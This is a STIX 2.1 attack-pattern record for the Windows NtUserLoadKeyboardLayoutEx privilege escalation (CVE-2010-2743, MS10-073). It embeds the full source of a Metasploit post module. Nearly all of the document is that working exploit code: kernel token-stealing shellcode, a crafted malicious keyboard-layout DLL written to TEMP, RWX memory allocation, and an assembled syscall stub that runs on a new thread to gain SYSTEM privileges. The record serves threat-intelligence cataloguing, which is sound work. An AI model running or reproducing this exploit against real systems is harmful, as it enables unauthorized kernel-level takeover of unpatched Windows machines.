{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--40fc1480-88be-4389-8e14-d41b4b12b492",
    "created": "2024-08-14T16:33:04.627573Z",
    "modified": "2024-08-14T16:33:04.627577Z",
    "name": "Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation",
    "description": " This module exploits the keyboard layout vulnerability exploited by Stuxnet. When processing specially crafted keyboard layout files (DLLs), the Windows kernel fails to validate that an array index is within the bounds of the array. By loading a specially crafted keyboard layout, an attacker can execute code in Ring 0.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/ms10_073_kbdlayout.rb",
            "external_id": "ms10_073_kbdlayout.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2743"
        },
        {
            "source_name": "reference",
            "url": "http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Version\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation',\n        'Description' => %q{\n          This module exploits the keyboard layout vulnerability exploited by Stuxnet. When\n          processing specially crafted keyboard layout files (DLLs), the Windows kernel fails\n          to validate that an array index is within the bounds of the array. By loading\n          a specially crafted keyboard layout, an attacker can execute code in Ring 0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ruben Santamarta', # First public exploit\n          'jduck' # Metasploit module\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          [ 'OSVDB', '68552' ],\n          [ 'CVE', '2010-2743' ],\n          [ 'MSB', 'MS10-073' ],\n          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],\n          [ 'EDB', '15985' ]\n        ],\n        'DisclosureDate' => '2010-10-12',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_delete_file\n              stdapi_railgun_api\n              stdapi_railgun_memwrite\n              stdapi_sys_config_getenv\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    mem_base = nil\n    dllpath = nil\n    hDll = false\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::Win7_SP0)\n      print_error(\"#{version.product_name} is not vulnerable.\")\n      return\n    end\n\n    unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::XP_SP2)\n      print_error(\"#{version.product_name} is vulnerable, but not supported by this module.\")\n      return\n    end\n\n    # syscalls from http://j00ru.vexillium.org/win32k_syscalls/\n    if version.build_number == Msf::WindowsVersion::Win2000\n      system_pid = 8\n      pid_off = 0x9c\n      flink_off = 0xa0\n      token_off = 0x12c\n      addr = 0x41424344\n      syscall_stub = <<~EOS\n        mov eax, 0x000011b6\n        lea edx, [esp+4]\n        int 0x2e\n        ret 0x1c\n      EOS\n    else # XP\n      system_pid = 4\n      pid_off = 0x84\n      flink_off = 0x88\n      token_off = 0xc8\n      addr = 0x60636261\n      syscall_stub = <<~EOS\n        mov eax, 0x000011c6\n        mov edx, 0x7ffe0300\n        call [edx]\n        ret 0x1c\n      EOS\n    end\n\n    ring0_code =\n      # \"\\xcc\" +\n      # save registers -- necessary for successful recovery\n      \"\\x60\" +\n      # get EPROCESS from ETHREAD\n      \"\\x64\\xa1\\x24\\x01\\x00\\x00\" \\\n      \"\\x8b\\x70\\x44\" +\n      # init PID search\n      \"\\x89\\xf0\" \\\n      \"\\xbb\" + 'FFFF' \\\n      \"\\xb9\" + 'PPPP' +\n      # look for the system pid EPROCESS\n      \"\\xba\" + 'SSSS' \\\n      \"\\x8b\\x04\\x18\" \\\n      \"\\x29\\xd8\" \\\n      \"\\x39\\x14\\x08\" \\\n      \"\\x75\\xf6\" +\n      # save the system token addr in edi\n      \"\\xbb\" + 'TTTT' \\\n      \"\\x8b\\x3c\\x18\" \\\n      \"\\x83\\xe7\\xf8\" +\n      # re-init the various offsets\n      \"\\x89\\xf0\" \\\n      \"\\xbb\" + 'FFFF' \\\n      \"\\xb9\" + 'PPPP' +\n      # find the target pid token\n      \"\\xba\" + 'TPTP' \\\n      \"\\x8b\\x04\\x18\" \\\n      \"\\x29\\xd8\" \\\n      \"\\x39\\x14\\x08\" \\\n      \"\\x75\\xf6\" +\n      # set the target pid's token to the system token\n      \"\\xbb\" + 'TTTT' \\\n      \"\\x89\\x3c\\x18\" +\n      # restore start context\n      \"\\x61\" +\n      # recover in ring0, return to caller\n      \"\\xc2\\x0c\\00\"\n\n    dll_data =\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\xE0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2E\\x64\\x61\\x74\\x61\\x00\\x00\\x00\" \\\n      \"\\xE6\\x00\\x00\\x00\\x60\\x01\\x00\\x00\\xE6\\x00\\x00\\x00\\x60\\x01\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x94\\x01\\x00\\x00\\x9E\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\xA6\\x01\\x00\\x00\\xAA\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x9C\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x01\\x00\\x00\\x00\\xC2\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    pid = session.sys.process.getpid\n    print_status('Attempting to elevate PID 0x%x' % pid)\n\n    # Prepare the shellcode (replace platform specific stuff, and pid)\n    ring0_code.gsub!('FFFF', [flink_off].pack('V'))\n    ring0_code.gsub!('PPPP', [pid_off].pack('V'))\n    ring0_code.gsub!('SSSS', [system_pid].pack('V'))\n    ring0_code.gsub!('TTTT', [token_off].pack('V'))\n    ring0_code.gsub!('TPTP', [pid].pack('V'))\n\n    # Create the malicious Keyboard Layout file...\n    tmpdir = session.sys.config.getenv('TEMP')\n    fname = 'p0wns.boom'\n    dllpath = \"#{tmpdir}\\\\#{fname}\"\n    fd = session.fs.file.new(dllpath, 'wb')\n    fd.write(dll_data)\n    fd.close\n\n    # Can't use this atm, no handle access via stdapi :(\n    # dll_fd = session.fs.file.new(dllpath, 'rb')\n    # Instead, we'll use railgun to re-open the file\n    ret = session.railgun.kernel32.CreateFileA(dllpath, GENERIC_READ, 1, nil, 3, 0, 0)\n    print_status(ret.inspect)\n    if ret['return'] < 1\n      print_error(\"Unable to open #{dllpath}\")\n      return\n    end\n    hDll = ret['return']\n    print_status(\"Wrote malicious keyboard layout to #{dllpath} ..\")\n\n    # Allocate some RWX virtual memory for our use..\n    mem_base = addr & 0xffff0000\n    mem_size = (addr & 0xffff) + 0x1000\n    mem_size += (0x1000 - (mem_size % 0x1000))\n    mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n    if (mem['return'] != mem_base)\n      print_error('Unable to allocate RWX memory @ 0x%x' % mem_base)\n      return\n    end\n    print_status(format('Allocated 0x%x bytes of memory @ 0x%x', mem_size, mem_base))\n\n    # Initialize the buffer to contain NO-OPs\n    nops = \"\\x90\" * mem_size\n    ret = session.railgun.memwrite(mem_base, nops, nops.length)\n    if !ret\n      print_error('Unable to fill memory with NO-OPs')\n      return\n    end\n\n    # Copy the shellcode to the desired place\n    ret = session.railgun.memwrite(addr, ring0_code, ring0_code.length)\n    if !ret\n      print_error('Unable to copy ring0 payload')\n      return\n    end\n\n    # InitializeUnicodeStr(&uStr,L\"pwn3d.dll\"); -- Is this necessary?\n    pKLID = mem_base\n    pStr = pKLID + (2 + 2 + 4)\n    kbd_name = 'pwn3d.dll'\n    uni_name = Rex::Text.to_unicode(kbd_name + \"\\x00\")\n    ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)\n    if !ret\n      print_error('Unable to copy unicode string data')\n      return\n    end\n    unicode_str = [\n      kbd_name.length * 2,\n      uni_name.length,\n      pStr\n    ].pack('vvV')\n    ret = session.railgun.memwrite(pKLID, unicode_str, unicode_str.length)\n    if !ret\n      print_error('Unable to copy UNICODE_STRING structure')\n      return\n    end\n    print_status('Initialized RWX buffer ...')\n\n    # Get the current Keyboard Layout\n    ret = session.railgun.user32.GetKeyboardLayout(0)\n    if ret['return'] < 1\n      print_error('Unable to GetKeyboardLayout')\n      return\n    end\n    hKL = ret['return']\n    print_status('Current Keyboard Layout: 0x%x' % hKL)\n\n# _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(\n#  IN HANDLE Handle,\n#  IN DWORD offTable,\n#  IN PUNICODE_STRING puszKeyboardName,\n#  IN HKL hKL,\n#  IN PUNICODE_STRING puszKLID,\n#  IN DWORD dwKLID,\n#  IN UINT Flags\n# )\n\n# Again, railgun/meterpreter doesn't implement calling a non-dll function, so\n# I tried to hack up this call to KiFastSystemCall, but that didn't work either...\n=begin\n    session.railgun.add_function('ntdll', 'KiFastSystemCall', 'DWORD',\n      [\n        [ 'DWORD', 'syscall', 'in' ],\n        [ 'DWORD', 'handle', 'in' ],\n        [ 'DWORD', 'offTable', 'in' ],\n        [ 'PBLOB', 'pKbdName', 'in' ],\n        [ 'DWORD', 'hKL', 'in' ],\n        [ 'PBLOB', 'pKLID', 'in' ],\n        [ 'DWORD', 'dwKLID', 'in' ],\n        [ 'DWORD', 'Flags', 'in' ]\n      ])\n    ret = session.railgun.ntdll.KiFastSystemCall(dll_fd, 0x1ae0160, nil, hKL, pKLID, 0x666, 0x101)\n    print_status(ret.inspect)\n=end\n\n    # Instead, we'll craft a machine code blob to setup the stack and perform\n    # the system call..\n    asm = <<~EOS\n      pop esi\n      push 0x101\n      push 0x666\n      push #{'0x%x' % pKLID}\n      push #{'0x%x' % hKL}\n      push 0\n      push 0x1ae0160\n      push #{'0x%x' % hDll}\n      push esi\n      #{syscall_stub}\n    EOS\n    # print_status(\"\\n\" + asm)\n    bytes = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string\n    # print_status(\"\\n\" + Rex::Text.to_hex_dump(bytes))\n\n    # Copy this new system call wrapper function into our RWX memory\n    func_ptr = mem_base + 0x1000\n    ret = session.railgun.memwrite(func_ptr, bytes, bytes.length)\n    if !ret\n      print_error('Unable to copy system call stub')\n      return\n    end\n    print_status('Patched in syscall wrapper @ 0x%x' % func_ptr)\n\n    # GO GO GO\n    ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, 'CREATE_SUSPENDED', nil)\n    if ret['return'] < 1\n      print_error('Unable to CreateThread')\n      return\n    end\n    hthread = ret['return']\n\n    # Resume the thread to actually have the syscall happen\n    ret = client.railgun.kernel32.ResumeThread(hthread)\n    if ret['return'] < 1\n      print_error('Unable to ResumeThread')\n      return\n    end\n    print_good('Successfully executed syscall wrapper!')\n\n    # Now, send some input to cause ring0 payload execution...\n    print_status('Attempting to cause the ring0 payload to execute...')\n    vInput = [\n      1, # INPUT_KEYBOARD - input type\n      # KEYBDINPUT struct\n      0x0,  # wVk\n      0x0,  # wScan\n      0x0,  # dwFlags\n      0x0,  # time\n      0x0,  # dwExtraInfo\n      0x0,  # pad 1\n      0x0   # pad 2\n    ].pack('VvvVVVVV')\n    ret = session.railgun.user32.SendInput(1, vInput, vInput.length)\n    print_status('SendInput: ' + ret.inspect)\n  ensure\n    # Clean up\n    if mem_base\n      ret = session.railgun.kernel32.VirtualFree(mem_base, 0, MEM_RELEASE)\n      if !(ret['return'])\n        print_error('Unable to free memory @ 0x%x' % mem_base)\n      end\n    end\n\n    # dll_fd.close\n    if hDll\n      ret = session.railgun.kernel32.CloseHandle(hDll)\n      if !(ret['return'])\n        print_error('Unable to CloseHandle')\n      end\n    end\n\n    session.fs.file.rm(dllpath) if dllpath\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}